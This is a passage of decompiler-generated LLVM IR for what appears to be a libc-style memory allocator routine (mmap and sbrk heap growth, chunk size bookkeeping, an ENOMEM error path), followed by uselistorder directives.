  %v2_16510 = load i32, i32* %sb.global-to-local, align 4
  %v3_16510 = add i32 %v2_16510, %v1_16510
  %v2_16514 = load i32, i32* @r5, align 4
  %v3_16514 = add i32 %v3_16510, %v2_16514
  store i32 %v3_16514, i32* %r3.global-to-local, align 4
  %v2_16518 = load i32, i32* %fp.global-to-local, align 4
  %v3_16518 = and i32 %v2_16518, %v3_16514
  store i32 %v3_16518, i32* @r5, align 4
  br label %.thread29

.thread29thread-pre-split:                        ; preds = %dec_label_pc_164fc
  %v0_1651c.pr = load i32, i32* @r5, align 4
  br label %.thread29

.thread29:                                        ; preds = %.thread29thread-pre-split, %bb155
  %v0_1651c = phi i32 [ %v0_1651c.pr, %.thread29thread-pre-split ], [ %v3_16518, %bb155 ]
  %v2_1651c = icmp ugt i32 %v0_1651c, 1048575
  br i1 %v2_1651c, label %bb157, label %bb156

bb156:                                            ; preds = %.thread29
  store i32 1048576, i32* @r5, align 4
  br label %bb157

bb157:                                            ; preds = %.thread29, %bb156
  %v0_16534 = phi i32 [ %v0_1651c, %.thread29 ], [ 1048576, %bb156 ]
  %v1_16524 = load i32, i32* @sl, align 4
  %tmp214 = icmp ugt i32 %v0_16534, %v1_16524
  br i1 %tmp214, label %dec_label_pc_1652c, label %dec_label_pc_16790

dec_label_pc_1652c:                               ; preds = %bb157
  store i32 0, i32* %ip.global-to-local, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  store i32 %v0_16534, i32* %r1.global-to-local, align 4
  store i32 3, i32* %r2.global-to-local, align 4
  store i32 34, i32* %r3.global-to-local, align 4
  %v6_16548 = call i32 @mmap(i32 0, i32 %v0_16534, i32 3, i32 34, i32 0, i32 0)
  store i32 %v6_16548, i32* %r0.global-to-local, align 4
  %v3_1654c = icmp eq i32 %v6_16548, -1
  %v8_1654c = icmp eq i32 %v6_16548, -1
  store i32 %v6_16548, i32* @r4, align 4
  br i1 %v8_1654c, label %.thread32, label %bb158

bb158:                                            ; preds = %dec_label_pc_1652c
  %v1_16554 = load i32, i32* %r6.global-to-local, align 4
  %v2_16554 = add i32 %v1_16554, 864
  %v3_16554 = inttoptr i32 %v2_16554 to i32*
  %v4_16554 = load i32, i32* %v3_16554, align 4
  %v2_16558 = load i32, i32* @r5, align 4
  %v3_16558 = add i32 %v2_16558, %v6_16548
  store i32 %v3_16558, i32* %r0.global-to-local, align 4
  %v2_1655c = and i32 %v4_16554, -2
  store i32 %v2_1655c, i32* %r3.global-to-local, align 4
  store i32 %v2_1655c, i32* %v3_16554, align 4
  br label %.thread32

.thread32:                                        ; preds = %dec_label_pc_1652c, %bb158
  br i1 %v3_1654c, label %dec_label_pc_16568, label %dec_label_pc_1656c

dec_label_pc_16568:                               ; preds = %.thread32, %dec_label_pc_164e8
  store i32 -1, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_1656c

dec_label_pc_1656c:                               ; preds = %.thread32, %dec_label_pc_16568
  %v0_1656c = load i32, i32* @r4, align 4
  %v7_1656c = icmp eq i32 %v0_1656c, -1
  br i1 %v7_1656c, label %dec_label_pc_16790, label %dec_label_pc_16574

dec_label_pc_16574:                               ; preds = %dec_label_pc_1656c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  %v4_1657c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_1657c, i32* %ip.global-to-local, align 4
  store i32 %v3_164ac, i32* %r2.global-to-local, align 4
  %v1_16584 = add i32 %v4_1657c, 872
  %v2_16584 = inttoptr i32 %v1_16584 to i32*
  %v3_16584 = load i32, i32* %v2_16584, align 4
  %v1_16588 = load i32, i32* @r8, align 4
  %v2_16588 = add i32 %v1_16588, %v3_164ac
  store i32 %v2_16588, i32* %r1.global-to-local, align 4
  %v0_1658c = load i32, i32* @r5, align 4
  %v2_1658c = add i32 %v0_1658c, %v3_16584
  store i32 %v2_1658c, i32* %r3.global-to-local, align 4
  %v9_16590 = icmp eq i32 %v0_1656c, %v2_16588
  br i1 %v9_16590, label %bb159, label %.thread122

.thread122:                                       ; preds = %dec_label_pc_16574
  store i32 %v2_1658c, i32* %v2_16584, align 4
  br label %dec_label_pc_165ac

bb159:                                            ; preds = %dec_label_pc_16574
  %v1_16594 = load i32, i32* %r0.global-to-local, align 4
  %v8_16594 = icmp eq i32 %v1_16594, -1
  store i32 %v2_1658c, i32* %v2_16584, align 4
  br i1 %v8_16594, label %.thread34, label %dec_label_pc_165ac

.thread34:                                        ; preds = %bb159
  %v1_1659c = load i32, i32* @r5, align 4
  %v2_1659c = load i32, i32* @r8, align 4
  %v3_1659c = add i32 %v2_1659c, %v1_1659c
  %v2_165a0 = or i32 %v3_1659c, 1
  store i32 %v2_165a0, i32* %r3.global-to-local, align 4
  %v2_165a4 = load i32, i32* %r2.global-to-local, align 4
  %v3_165a4 = add i32 %v2_165a4, 4
  %v4_165a4 = inttoptr i32 %v3_165a4 to i32*
  store i32 %v2_165a0, i32* %v4_165a4, align 4
  br label %dec_label_pc_16724

dec_label_pc_165ac:                               ; preds = %bb159, %.thread122
  %v0_165b0.pr = load i32, i32* @r8, align 4
  %v0_165ac = load i32, i32* %ip.global-to-local, align 4
  %v1_165ac = add i32 %v0_165ac, 864
  %v2_165ac = inttoptr i32 %v1_165ac to i32*
  %v3_165ac = load i32, i32* %v2_165ac, align 4
  store i32 %v3_165ac, i32* %r2.global-to-local, align 4
  %v2_165b0 = icmp eq i32 %v0_165b0.pr, 0
  br i1 %v2_165b0, label %.thread37, label %.thread36

.thread37:                                        ; preds = %dec_label_pc_165ac
  store i32 0, i32* %r3.global-to-local, align 4
  br label %.thread40

.thread36:                                        ; preds = %dec_label_pc_165ac
  %v2_165b8 = urem i32 %v3_165ac, 2
  store i32 %v2_165b8, i32* %r3.global-to-local, align 4
  %v2_165bc = icmp eq i32 %v2_165b8, 0
  br i1 %v2_165bc, label %.thread40, label %dec_label_pc_165c4

dec_label_pc_165c4:                               ; preds = %.thread36
  %v0_165c4 = load i32, i32* @r4, align 4
  %v1_165c4 = load i32, i32* %r1.global-to-local, align 4
  %v3_165c4 = icmp ult i32 %v0_165c4, %v1_165c4
  br i1 %v3_165c4, label %bb160, label %.thread40

bb160:                                            ; preds = %dec_label_pc_165c4
  %v2_165c8 = and i32 %v3_165ac, -2
  store i32 %v2_165c8, i32* %r3.global-to-local, align 4
  store i32 %v2_165c8, i32* %v2_165ac, align 4
  br label %.thread40

.thread40:                                        ; preds = %dec_label_pc_165c4, %.thread37, %.thread36, %bb160
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %ip.global-to-local, align 4
  %v4_165d8 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_165d8, i32* @r7, align 4
  %v1_165dc = add i32 %v4_165d8, 864
  %v2_165dc = inttoptr i32 %v1_165dc to i32*
  %v3_165dc = load i32, i32* %v2_165dc, align 4
  store i32 %v3_165dc, i32* %r3.global-to-local, align 4
  %v1_165e0 = urem i32 %v3_165dc, 2
  store i32 %v1_165e0, i32* @r6, align 4
  %v2_165e0 = icmp eq i32 %v1_165e0, 0
  br i1 %v2_165e0, label %dec_label_pc_16674, label %dec_label_pc_165e8

dec_label_pc_165e8:                               ; preds = %.thread40
  %v0_165e8 = load i32, i32* @r8, align 4
  %v2_165e8 = icmp eq i32 %v0_165e8, 0
  br i1 %v2_165e8, label %.thread43, label %bb161

bb161:                                            ; preds = %dec_label_pc_165e8
  %v2_165ec = add i32 %v4_165d8, 872
  %v3_165ec = inttoptr i32 %v2_165ec to i32*
  %v4_165ec = load i32, i32* %v3_165ec, align 4
  store i32 %v4_165ec, i32* %r2.global-to-local, align 4
  %v1_165f0 = load i32, i32* %r1.global-to-local, align 4
  %v2_165f0 = load i32, i32* @r4, align 4
  %v3_165f0 = sub i32 %v2_165f0, %v1_165f0
  %v3_165f4 = add i32 %v3_165f0, %v4_165ec
  store i32 %v3_165f4, i32* %r3.global-to-local, align 4
  store i32 %v3_165f4, i32* %v3_165ec, align 4
  br label %.thread43

.thread43:                                        ; preds = %dec_label_pc_165e8, %bb161
  %v0_165fc = load i32, i32* @r4, align 4
  %v1_165fc = urem i32 %v0_165fc, 8
  store i32 %v1_165fc, i32* %r3.global-to-local, align 4
  %v2_165fc = icmp eq i32 %v1_165fc, 0
  br i1 %v2_165fc, label %.thread44, label %bb162

bb162:                                            ; preds = %.thread43
  %v2_16600 = sub nsw i32 8, %v1_165fc
  store i32 %v2_16600, i32* %r3.global-to-local, align 4
  %v3_16604 = add i32 %v2_16600, %v0_165fc
  store i32 %v3_16604, i32* @r7, align 4
  br label %.thread44

.thread44:                                        ; preds = %.thread43, %bb162
  %v0_1660c = phi i32 [ 0, %.thread43 ], [ %v2_16600, %bb162 ]
  %v1_16608 = load i32, i32* @r5, align 4
  %v2_16608 = add i32 %v1_16608, %v0_165fc
  store i32 %v2_16608, i32* @r6, align 4
  %v1_1660c = load i32, i32* @r8, align 4
  %v2_1660c = add i32 %v2_16608, %v0_1660c
  %v2_16610 = add i32 %v2_1660c, %v1_1660c
  store i32 %v2_16610, i32* %r1.global-to-local, align 4
  %v1_16614 = load i32, i32* %sb.global-to-local, align 4
  %v2_16614 = add i32 %v1_16614, %v2_16610
  %v1_16618 = load i32, i32* %fp.global-to-local, align 4
  %v2_16618 = and i32 %v1_16618, %v2_16614
  store i32 %v2_16618, i32* %r2.global-to-local, align 4
  %v2_1661c = sub i32 0, %v2_16608
  store i32 %v2_1661c, i32* %r3.global-to-local, align 4
  %v2_16620 = sub i32 %v2_16618, %v2_16608
  store i32 %v2_16620, i32* @r5, align 4
  store i32 %v2_16620, i32* %r0.global-to-local, align 4
  br i1 %v2_165fc, label %bb163, label %bb164

bb163:                                            ; preds = %.thread44
  store i32 %v0_165fc, i32* @r7, align 4
  br label %bb164

bb164:                                            ; preds = %.thread44, %bb163
  %v1_1662c = call i32 @__GI_sbrk(i32 %v2_16620)
  store i32 %v1_1662c, i32* %r0.global-to-local, align 4
  %v3_16630 = icmp eq i32 %v1_1662c, -1
  br i1 %v3_16630, label %dec_label_pc_16638, label %dec_label_pc_16648

dec_label_pc_16638:                               ; preds = %bb164
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_1663c = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_1663c, i32* %r0.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  br label %dec_label_pc_166a0

dec_label_pc_16648:                               ; preds = %bb164
  %v1_16648 = load i32, i32* @r4, align 4
  %v3_16648 = icmp ult i32 %v1_1662c, %v1_16648
  br i1 %v3_16648, label %dec_label_pc_16650, label %dec_label_pc_166a0

dec_label_pc_16650:                               ; preds = %dec_label_pc_16648
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r0.global-to-local, align 4
  %v4_16658 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_16658, i32* %r2.global-to-local, align 4
  %v1_1665c = add i32 %v4_16658, 864
  %v2_1665c = inttoptr i32 %v1_1665c to i32*
  %v3_1665c = load i32, i32* %v2_1665c, align 4
  %v0_16660 = load i32, i32* @r6, align 4
  store i32 %v0_16660, i32* %r0.global-to-local, align 4
  %v1_16664 = and i32 %v3_1665c, -2
  store i32 %v1_16664, i32* %r3.global-to-local, align 4
  store i32 0, i32* @r5, align 4
  store i32 %v1_16664, i32* %v2_1665c, align 4
  br label %dec_label_pc_166a0

dec_label_pc_16674:                               ; preds = %.thread40
  %v0_16674 = load i32, i32* %r0.global-to-local, align 4
  %v3_16674 = icmp eq i32 %v0_16674, -1
  br i1 %v3_16674, label %dec_label_pc_1667c, label %dec_label_pc_16698

dec_label_pc_1667c:                               ; preds = %dec_label_pc_16674
  store i32 0, i32* %r0.global-to-local, align 4
  %v1_16680 = call i32 @__GI_sbrk(i32 0)
  store i32 %v1_16680, i32* %r0.global-to-local, align 4
  %v0_16684 = load i32, i32* @r7, align 4
  %v1_16684 = add i32 %v0_16684, 872
  %v2_16684 = inttoptr i32 %v1_16684 to i32*
  %v3_16684 = load i32, i32* %v2_16684, align 4
  store i32 %v3_16684, i32* %r2.global-to-local, align 4
  %v0_16688 = load i32, i32* @r4, align 4
  %v0_1668c = load i32, i32* @r5, align 4
  %v2_16688 = add i32 %v3_16684, %v1_16680
  %v2_1668c = sub i32 %v2_16688, %v0_16688
  %v2_16690 = sub i32 %v2_1668c, %v0_1668c
  store i32 %v2_16690, i32* %r3.global-to-local, align 4
  store i32 %v2_16690, i32* %v2_16684, align 4
  %v0_1669c.pre = load i32, i32* @r6, align 4
  br label %dec_label_pc_16698

dec_label_pc_16698:                               ; preds = %dec_label_pc_16674, %dec_label_pc_1667c
  %v0_1669c = phi i32 [ 0, %dec_label_pc_16674 ], [ %v0_1669c.pre, %dec_label_pc_1667c ]
  %v0_16698 = load i32, i32* @r4, align 4
  store i32 %v0_16698, i32* @r7, align 4
  store i32 %v0_1669c, i32* @r5, align 4
  br label %dec_label_pc_166a0

dec_label_pc_166a0:                               ; preds = %dec_label_pc_16648, %dec_label_pc_16650, %dec_label_pc_16638, %dec_label_pc_16698
  %v0_166a0 = load i32, i32* %r0.global-to-local, align 4
  %v7_166a0 = icmp eq i32 %v0_166a0, -1
  br i1 %v7_166a0, label %dec_label_pc_16724, label %dec_label_pc_166a8

dec_label_pc_166a8:                               ; preds = %dec_label_pc_166a0
  %v1_166a8 = load i32, i32* @r5, align 4
  %v2_166a8 = add i32 %v1_166a8, %v0_166a0
  %v0_166ac = load i32, i32* @r7, align 4
  %v2_166ac = sub i32 %v2_166a8, %v0_166ac
  %v1_166b0 = or i32 %v2_166ac, 1
  %v2_166b4 = add i32 %v0_166ac, 4
  %v3_166b4 = inttoptr i32 %v2_166b4 to i32*
  store i32 %v1_166b0, i32* %v3_166b4, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r1.global-to-local, align 4
  store i32 32, i32* %r3.global-to-local, align 4
  %v4_166c0 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_166c0, i32* @r6, align 4
  %v1_166c4 = add i32 %v4_166c0, 872
  %v2_166c4 = inttoptr i32 %v1_166c4 to i32*
  %v3_166c4 = load i32, i32* %v2_166c4, align 4
  %v0_166c8 = load i32, i32* @r8, align 4
  %v2_166c8 = icmp eq i32 %v0_166c8, 0
  %v0_166cc = load i32, i32* @r5, align 4
  %v2_166cc = add i32 %v0_166cc, %v3_166c4
  store i32 %v2_166cc, i32* %r3.global-to-local, align 4
  store i32 %v2_166cc, i32* %v2_166c4, align 4
  %v0_166d4 = load i32, i32* @r7, align 4
  %v1_166d4 = load i32, i32* @r6, align 4
  %v2_166d4 = add i32 %v1_166d4, 44
  %v3_166d4 = inttoptr i32 %v2_166d4 to i32*
  store i32 %v0_166d4, i32* %v3_166d4, align 4
  br i1 %v2_166c8, label %dec_label_pc_16724, label %dec_label_pc_166dc

dec_label_pc_166dc:                               ; preds = %dec_label_pc_166a8
  %v0_166e0 = load i32, i32* @r8, align 4
  %v1_166e0 = add i32 %v0_166e0, -12
  %v1_166e4 = and i32 %v1_166e0, -8
  store i32 %v3_164ac, i32* %ip.global-to-local, align 4
  %v2_166ec = add i32 %v1_166e4, %v3_164ac
  store i32 %v2_166ec, i32* %r1.global-to-local, align 4
  %v2_166f0 = icmp ugt i32 %v1_166e4, 14
  store i32 5, i32* %r2.global-to-local, align 4
  %v1_166f8 = or i32 %v1_166e4, 1
  store i32 %v1_166f8, i32* %r3.global-to-local, align 4
  store i32 %v1_166f8, i32* %v2_164b8, align 4
  %v0_16700 = load i32, i32* %r2.global-to-local, align 4
  %v1_16700 = load i32, i32* %r1.global-to-local, align 4
  %v2_16700 = add i32 %v1_16700, 8
  %v3_16700 = inttoptr i32 %v2_16700 to i32*
  store i32 %v0_16700, i32* %v3_16700, align 4
  %v0_16704 = load i32, i32* %r2.global-to-local, align 4
  %v1_16704 = load i32, i32* %r1.global-to-local, align 4
  %v2_16704 = add i32 %v1_16704, 4
  %v3_16704 = inttoptr i32 %v2_16704 to i32*
  store i32 %v0_16704, i32* %v3_16704, align 4
  br i1 %v2_166f0, label %dec_label_pc_1670c, label %dec_label_pc_16724

dec_label_pc_1670c:                               ; preds = %dec_label_pc_166dc
  %v0_1670c = load i32, i32* @r6, align 4
  %v1_1670c = add i32 %v0_1670c, 836
  %v2_1670c = inttoptr i32 %v1_1670c to i32*
  %v3_1670c = load i32, i32* %v2_1670c, align 4
  store i32 %v3_1670c, i32* @r4, align 4
  store i32 -1, i32* %r3.global-to-local, align 4
  %v0_16714 = load i32, i32* %ip.global-to-local, align 4
  %v1_16714 = add i32 %v0_16714, 8
  store i32 %v1_16714, i32* @r0, align 4
  store i32 -1, i32* %v2_1670c, align 4
  %v0_1671c = call i32 @free()
  store i32 %v0_1671c, i32* %r0.global-to-local, align 4
  %v0_16720 = load i32, i32* @r4, align 4
  %v1_16720 = load i32, i32* @r6, align 4
  %v2_16720 = add i32 %v1_16720, 836
  %v3_16720 = inttoptr i32 %v2_16720 to i32*
  store i32 %v0_16720, i32* %v3_16720, align 4
  br label %dec_label_pc_16724

dec_label_pc_16724:                               ; preds = %.thread34, %dec_label_pc_166dc, %dec_label_pc_166a8, %dec_label_pc_166a0, %dec_label_pc_1670c
  store i32 32, i32* %r3.global-to-local, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r0.global-to-local, align 4
  %v4_1672c = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 32) to i32*), align 4
  store i32 %v4_1672c, i32* %lr.global-to-local, align 4
  %v1_16730 = add i32 %v4_1672c, 872
  store i32 %v1_16730, i32* %r1.global-to-local, align 4
  %v1_16734 = inttoptr i32 %v1_16730 to i32*
  %v2_16734 = load i32, i32* %v1_16734, align 4
  store i32 %v2_16734, i32* %r1.global-to-local, align 4
  %v3_16734 = add i32 %v4_1672c, 876
  %v4_16734 = inttoptr i32 %v3_16734 to i32*
  %v5_16734 = load i32, i32* %v4_16734, align 4
  store i32 %v5_16734, i32* %r3.global-to-local, align 4
  %v1_1673c = add i32 %v4_1672c, 868
  %v2_1673c = inttoptr i32 %v1_1673c to i32*
  %v3_1673c = load i32, i32* %v2_1673c, align 4
  store i32 %v3_1673c, i32* %r3.global-to-local, align 4
  %v1_16740 = add i32 %v4_1672c, 884
  %v2_16740 = inttoptr i32 %v1_16740 to i32*
  %v3_16740 = load i32, i32* %v2_16740, align 4
  store i32 %v3_16740, i32* %r2.global-to-local, align 4
  %v2_16744 = add i32 %v3_1673c, %v2_16734
  store i32 %v2_16744, i32* %r3.global-to-local, align 4
  %tmp215 = icmp ugt i32 %v2_16734, %v5_16734
  br i1 %tmp215, label %bb165, label %bb166

bb165:                                            ; preds = %dec_label_pc_16724
  store i32 %v2_16734, i32* %v4_16734, align 4
  %v0_1674c.pre = load i32, i32* %r3.global-to-local, align 4
  %v1_1674c.pre = load i32, i32* %r2.global-to-local, align 4
  br label %bb166

bb166:                                            ; preds = %dec_label_pc_16724, %bb165
  %v1_1674c = phi i32 [ %v3_16740, %dec_label_pc_16724 ], [ %v1_1674c.pre, %bb165 ]
  %v4_16750 = phi i32 [ %v2_16744, %dec_label_pc_16724 ], [ %v0_1674c.pre, %bb165 ]
  %tmp216 = icmp ugt i32 %v4_16750, %v1_1674c
  br i1 %tmp216, label %bb167, label %bb168

bb167:                                            ; preds = %bb166
  %v5_16750 = load i32, i32* %lr.global-to-local, align 4
  %v6_16750 = add i32 %v5_16750, 884
  %v7_16750 = inttoptr i32 %v6_16750 to i32*
  store i32 %v4_16750, i32* %v7_16750, align 4
  br label %bb168

bb168:                                            ; preds = %bb166, %bb167
  %v0_16754 = load i32, i32* %lr.global-to-local, align 4
  %v1_16754 = add i32 %v0_16754, 44
  %v2_16754 = inttoptr i32 %v1_16754 to i32*
  %v3_16754 = load i32, i32* %v2_16754, align 4
  store i32 %v3_16754, i32* %ip.global-to-local, align 4
  %v1_16758 = add i32 %v3_16754, 4
  %v2_16758 = inttoptr i32 %v1_16758 to i32*
  %v3_16758 = load i32, i32* %v2_16758, align 4
  store i32 %v1_1636c, i32* %r1.global-to-local, align 4
  %v1_16760 = and i32 %v3_16758, -4
  store i32 %v1_16760, i32* %r3.global-to-local, align 4
  %v3_16764 = icmp ult i32 %v1_16760, %v1_1636c
  br i1 %v3_16764, label %dec_label_pc_16790, label %dec_label_pc_1676c

dec_label_pc_1676c:                               ; preds = %bb168
  %v0_1676c = load i32, i32* @sl, align 4
  %v2_1676c = sub i32 %v1_16760, %v0_1676c
  %v2_16770 = add i32 %v0_1676c, %v3_16754
  store i32 %v2_16770, i32* %r1.global-to-local, align 4
  %v1_16774 = or i32 %v2_1676c, 1
  store i32 %v1_16774, i32* %r3.global-to-local, align 4
  %v1_16778 = or i32 %v0_1676c, 1
  store i32 %v1_16778, i32* %r2.global-to-local, align 4
  %v1_1677c = add i32 %v3_16754, 8
  store i32 %v1_1677c, i32* %r0.global-to-local, align 4
  store i32 %v1_16778, i32* %v2_16758, align 4
  %v0_16784 = load i32, i32* %r1.global-to-local, align 4
  %v1_16784 = load i32, i32* %lr.global-to-local, align 4
  %v2_16784 = add i32 %v1_16784, 44
  %v3_16784 = inttoptr i32 %v2_16784 to i32*
  store i32 %v0_16784, i32* %v3_16784, align 4
  %v0_16788 = load i32, i32* %r3.global-to-local, align 4
  %v1_16788 = load i32, i32* %r1.global-to-local, align 4
  %v2_16788 = add i32 %v1_16788, 4
  %v3_16788 = inttoptr i32 %v2_16788 to i32*
  store i32 %v0_16788, i32* %v3_16788, align 4
  br label %dec_label_pc_167a0

dec_label_pc_16790:                               ; preds = %bb157, %bb168, %dec_label_pc_1656c
  %v0_16790 = call i32 @__GI___errno_location()
  store i32 12, i32* %r3.global-to-local, align 4
  %v2_16798 = inttoptr i32 %v0_16790 to i32*
  store i32 12, i32* %v2_16798, align 4
  store i32 0, i32* %r0.global-to-local, align 4
  br label %dec_label_pc_167a0

dec_label_pc_167a0:                               ; preds = %bb151, %bb150, %dec_label_pc_1676c, %dec_label_pc_163b4, %dec_label_pc_16790
  %v0_167a0 = load i32, i32* %r0.global-to-local, align 4
  store i32 %v0_167a0, i32* %r4.global-to-local, align 4
  br label %dec_label_pc_167a4

dec_label_pc_167a4:                               ; preds = %.thread1, %dec_label_pc_16380, %.thread121, %dec_label_pc_161f0, %dec_label_pc_161e4, %dec_label_pc_1604c, %dec_label_pc_15fd0, %dec_label_pc_167a0
  store i32 %v2_15ef8, i32* %r0.global-to-local, align 4
  store i32 1, i32* %r1.global-to-local, align 4
  store i32 24, i32* @r3, align 4
  store i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32* %r2.global-to-local, align 4
  %v4_167b4 = load i32, i32* inttoptr (i32 add (i32 ptrtoint (i32* @global_var_2a010.835 to i32), i32 24) to i32*), align 4
  store i32 %v4_167b4, i32* @ip, align 4
  store i32 92096, i32* %lr.global-to-local, align 4
  call void @__pseudo_branch(i32 %v4_167b4)
  br label %dec_label_pc_167c0

dec_label_pc_167c0:                               ; preds = %dec_label_pc_15f30, %dec_label_pc_167a4
  %v0_167c0 = load i32, i32* %r4.global-to-local, align 4
  store i32 %v0_167c0, i32* %r0.global-to-local, align 4
  store i32 %v3_15ecc, i32* @r4, align 4
  store i32 %v6_15ecc, i32* @r5, align 4
  store i32 %v9_15ecc, i32* @r6, align 4
  store i32 %v12_15ecc, i32* @r7, align 4
  store i32 %v15_15ecc, i32* @r8, align 4
  store i32 %v18_15ecc, i32* @sb, align 4
  store i32 %v21_15ecc, i32* @sl, align 4
  store i32 %v24_15ecc, i32* @fp, align 4
  store i32 %v27_15ecc, i32* @lr, align 4
  ret i32 %v0_167c0

; uselistorder directives
  uselistorder i32 %v0_1676c, { 1, 0, 2 }
  uselistorder i32 %v3_16754, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16750, { 1, 0 }
  uselistorder i32 %v2_16734, { 2, 0, 1, 3 }
  uselistorder i32 %v4_1672c, { 1, 0, 2, 3, 4 }
  uselistorder i32 %v1_166e4, { 1, 2, 0 }
  uselistorder i32 %v0_166ac, { 1, 0 }
  uselistorder i32 %v0_166a0, { 1, 0 }
  uselistorder i32 %v2_16690, { 1, 0 }
  uselistorder i32 %v2_16620, { 2, 1, 0 }
  uselistorder i32 %v2_16608, { 1, 2, 0, 3 }
  uselistorder i32 %v2_16600, { 1, 0, 2 }
  uselistorder i32 %v1_165fc, { 2, 1, 0 }
  uselistorder i32 %v0_165fc, { 3, 1, 2, 0 }
  uselistorder i32 %v1_165e0, { 1, 0 }
  uselistorder i32 %v2_165b8, { 1, 0 }
  uselistorder i32 %v3_165ac, { 1, 0, 2 }
  uselistorder i32 %v2_1658c, { 1, 0, 2 }
  uselistorder i32* %v2_16584, { 1, 0, 2 }
  uselistorder i32 %v0_1656c, { 1, 0 }
  uselistorder i32 %v6_16548, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v0_16534, { 2, 1, 0 }
  uselistorder i32 %v0_1651c, { 1, 0 }
  uselistorder i32 %v2_164d8, { 1, 0, 2, 3 }
  uselistorder i32 %v1_164d4, { 1, 0 }
  uselistorder i32 %v3_164ac, { 0, 3, 1, 2, 4, 5 }
  uselistorder i32 %v2_1648c, { 1, 0, 2 }
  uselistorder i32 %v2_16474, { 1, 2, 0, 3 }
  uselistorder i32 %v1_1641c, { 2, 1, 0 }
  uselistorder i32 %v6_16410, { 3, 4, 2, 1, 0, 5 }
  uselistorder i32 %v3_163ec, { 2, 1, 0, 3 }
  uselistorder i32 %v3_163ac, { 1, 0, 2, 3 }
  uselistorder i32 %v0_1636c, { 5, 6, 7, 0, 1, 8, 3, 2, 4, 9 }
  uselistorder i32 %v3_16364, { 1, 0, 2, 3 }
  uselistorder i32 %v4_16360, { 1, 0, 2, 3, 4, 5, 6 }
  uselistorder i32 %v0_1634c, { 1, 0 }
  uselistorder i32 %v7_1630c, { 1, 0 }
  uselistorder i32 %v4_1630c, { 1, 0 }
  uselistorder i32 %v0_162dc, { 1, 0 }
  uselistorder i32 %v2_162b0, { 3, 2, 1, 0 }
  uselistorder i32 %ip.promoted, { 2, 0, 1 }
  uselistorder i32 %v0_162ac54, { 1, 0 }
  uselistorder i32 %v1_16278, { 1, 2, 0, 4, 3 }
  uselistorder i32 %v1_16260., { 1, 2, 0 }
  uselistorder i32 %v0_16268, { 0, 1, 3, 2 }
  uselistorder i32 %v1_16268, { 1, 0 }
  uselistorder i32 %v3_16248, { 1, 0 }
  uselistorder i32 %v4_16244, { 1, 0, 2 }
  uselistorder i32 %v1_161b4, { 6, 5, 4, 3, 2, 1, 0 }
  uselistorder i32 %v0_1620c, { 1, 0 }
  uselistorder i32 %v1_161f0, { 1, 0 }
  uselistorder i32 %v1_16090, { 1, 0 }
  uselistorder i32 %v0_161d0, { 2, 0, 1, 3 }
  uselistorder i32 %v3_16198, { 2, 0, 1, 3 }
  uselistorder i32 %v0_1622c.pre, { 1, 2, 0 }
  uselistorder i32 %v0_16174, { 2, 1, 0 }
  uselistorder i32 %v3_16168, { 5, 6, 4, 3, 2, 0, 1 }
  uselistorder i32 %v0_16088, { 0, 5, 4, 3, 1, 2 }
  uselistorder i32 %v1_16130, { 1, 0 }
  uselistorder i32 %v3_16124, { 1, 0 }
  uselistorder i32 %v0_16130, { 1, 0 }
  uselistorder i32 %v3_16108, { 0, 2, 3, 1 }
  uselistorder i32 %v2_160f8, { 1, 0, 2 }
  uselistorder i32 %v3_160b0, { 2, 1, 0 }
  uselistorder i32 %v0_160a0, { 3, 2, 1, 0 }
  uselistorder i32 %v0_16070, { 1, 0 }
  uselistorder i32 %v1_16024, { 2, 1, 0, 3 }
  uselistorder i32 %v0_16020, { 4, 2, 1, 3, 0 }
  uselistorder i32 %v3_15fc4, { 1, 2, 0, 3, 4 }
  uselistorder i32 %v3_15fb8, { 1, 0 }
  uselistorder i32 %v3_15f88, { 1, 0 }
  uselistorder i32 %v0_15f7c, { 5, 6, 4, 2, 0, 3, 1 }
  uselistorder i32 %v2_15f5c, { 0, 2, 1, 3 }
  uselistorder i1 %v7_15f50, { 1, 0 }
  uselistorder i32 %v0_15f28, { 1, 0 }
  uselistorder i32* %r8.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r5.global-to-local, { 2, 0, 1 }
  uselistorder i32* %r4.global-to-local, { 13, 0, 1, 2, 3, 4, 6, 5, 8, 9, 7, 10, 11, 12, 14, 15, 16 }
  uselistorder i32* %r3.global-to-local, { 3, 4, 5, 6, 7, 8, 9, 10, 11, 12, 13, 14, 15, 16, 17, 18, 19, 20, 21, 22, 23, 24, 25, 26, 27, 28, 29, 30, 31, 32, 33, 34, 35, 36, 37, 38, 39, 40, 44, 41, 42, 43, 45, 46, 47, 48, 0, 1, 49, 50, 51, 52, 53, 54, 55, 56, 57, 62, 58, 59, 60, 61, 63, 64, 65, 66, 67, 68, 69, 70, 71, 72, 73, 74, 75, 76, 82, 90, 77, 78, 79, 80, 81, 83, 84, 85, 86, 2, 87, 88, 89, 91, 92, 93, 94, 95, 96, 97, 98, 99, 100, 101, 102, 103, 104, 105, 106, 107, 108, 109 }
